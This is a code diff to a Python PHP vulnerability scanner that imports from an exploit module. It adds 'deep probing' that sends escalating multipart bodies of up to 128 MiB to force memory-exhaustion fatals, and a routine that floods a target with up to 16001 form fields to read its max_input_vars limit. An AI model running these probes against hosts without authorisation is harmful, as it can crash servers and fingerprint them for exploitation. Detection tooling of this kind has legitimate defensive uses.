@@ -21,9 +21,13 @@ import re
 import sys
 import urllib.parse
 
-from exploit import Target
+from exploit import Target, build_multipart
 
 PROBES = [(1, 4000), (8, 1020), (20, 1020)]
+# Escalating body sizes for deep probing (exploit verification): lets the
+# OOM fatal appear on hosts with a higher memory_limit than the template's
+# 20 MiB ceiling.
+DEEP_PROBE_MIB = (24, 32, 40, 48, 64, 96, 128)
 REJECTED = {400, 403, 411, 413, 414, 417, 422, 429, 431}
 
 POWERED_BY_RE = re.compile(
@@ -35,6 +39,11 @@ VERSION_RE = re.compile(
     r"(?:(?:[-+~_A-Za-z]|\.[A-Za-z])[0-9A-Za-z._+~-]*)?)(?:[ \t;,) \r]|$)",
     re.IGNORECASE | re.MULTILINE,
 )
+
+# "Allowed memory size of 8388608 bytes exhausted" -> memory_limit in bytes
+MEMORY_LIMIT_RE = re.compile(r"Allowed memory size of (\d+) bytes exhausted")
+# "Input variables exceeded 1000" -> max_input_vars
+MAX_VARS_RE = re.compile(r"Input variables exceeded (\d+)")
 
 # Result categories
 MEMORY_EXHAUSTION = "memory-exhaustion"
@@ -93,22 +102,61 @@ def _head_and_body(resp):
     return head.decode("latin1"), body
 
 
+def _parse_ini_facts(text, result):
+    """Pull memory_limit / max_input_vars out of PHP's own error messages."""
+    if result.get("memory_limit") is None:
+        m = MEMORY_LIMIT_RE.search(text)
+        if m:
+            result["memory_limit"] = int(m.group(1))
+    if result.get("max_input_vars") is None:
+        m = MAX_VARS_RE.search(text)
+        if m:
+            result["max_input_vars"] = int(m.group(1))
+
+
 def _status(head):
     m = re.match(r"HTTP/1\.[01] (\d{3})", head)
     return int(m.group(1)) if m else 0
 
 
-def check_url(url, timeout=90.0, verbose=True):
+def detect_max_vars(t, verbose=True):
+    """Find the target's max_input_vars by escalating tiny-field requests.
+
+    Each probe is cheap (1-byte field values); the warning text reveals the
+    configured limit. Returns the limit, or 1000 (the PHP default) when no
+    warning appears below 16001 fields.
+    """
+    for count in (1001, 2001, 4001, 8001, 16001):
+        parts = [((b"f%05d" % i)[:6], b"x", None) for i in range(count)]
+        body = build_multipart(parts, b"MV")
+        resp = t.post_body(body, "multipart/form-data; boundary=MV",
+                           read_cap=1 << 20)
+        _, resp_body = _head_and_body(resp)
+        text = resp_body.decode("latin1")
+        m = MAX_VARS_RE.search(text)
+        if m:
+            return int(m.group(1))
+    return 1000
+
+
+def check_url(url, timeout=90.0, verbose=True, deep=False):
     """Run the detection flow against one URL.
 
+    With deep=True (exploit verification), escalating body sizes are also
+    probed so hosts with a memory_limit above the template's 20 MiB still
+    show the OOM fatal.
+
     Returns a dict:
-      result  MEMORY_EXHAUSTION | VERSION_VULNERABLE | VERSION_EOL |
-              FIXED | UNKNOWN
-      version detected PHP version or ""
-      url     the scanned URL
+      result        MEMORY_EXHAUSTION | VERSION_VULNERABLE | VERSION_EOL |
+                    FIXED | UNKNOWN
+      version       detected PHP version or ""
+      memory_limit  memory_limit in bytes parsed from the OOM fatal (or None)
+      max_input_vars max_input_vars parsed from the warning (or None)
+      url           the scanned URL
     """
     t = Target(url, timeout=timeout, verbose=verbose)
-    result = {"result": UNKNOWN, "version": "", "url": url}
+    result = {"result": UNKNOWN, "version": "", "url": url,
+              "memory_limit": None, "max_input_vars": None}
     try:
         ctrl = t.post_body(
             b"--x\nContent-Disposition:name=a;filename=\n",
@@ -142,6 +190,7 @@ def check_url(url, timeout=90.0, verbose=True):
         if m:
             powered_by = m.group(1)
         text = resp_body.decode("latin1")
+        _parse_ini_facts(text, result)
         if ("Allowed memory size of" in text and "bytes exhausted" in text
                 and "Unknown" in text):
             matched = True
@@ -151,6 +200,33 @@ def check_url(url, timeout=90.0, verbose=True):
             break
         if version_verdict(powered_by) == "FIXED":
             break
+
+    # Deep probing (exploit verification): hosts with a higher memory_limit
+    # only show the OOM fatal for bodies larger than the template's 20 MiB.
+    if not matched and deep:
+        verdict_early = version_verdict(powered_by)
+        if verdict_early in ("VULNERABLE", "EOL"):
+            for size_mib in DEEP_PROBE_MIB:
+                body = build_probe(size_mib, 1020).encode("latin1")
+                resp = t.post_body(
+                    body,
+                    "multipart/form-data; boundary=",
+                    read_cap=1 << 20,
+                    timeout=timeout * 2,
+                )
+                head, resp_body = _head_and_body(resp)
+                text = resp_body.decode("latin1")
+                _parse_ini_facts(text, result)
+                if ("Allowed memory size of" in text
+                        and "bytes exhausted" in text and "Unknown" in text):
+                    matched = True
+                    break
+                if _status(head) in REJECTED:
+                    # post_max_size < memory_limit: this chain cannot OOM
+                    # through the request body on this host.
+                    break
+    if matched and deep and result["max_input_vars"] is None:
+        result["max_input_vars"] = detect_max_vars(t, verbose=verbose)
 
     vm = VERSION_RE.search(head) if not matched else None
     # Prefer a version seen in any response header (control or last probe).
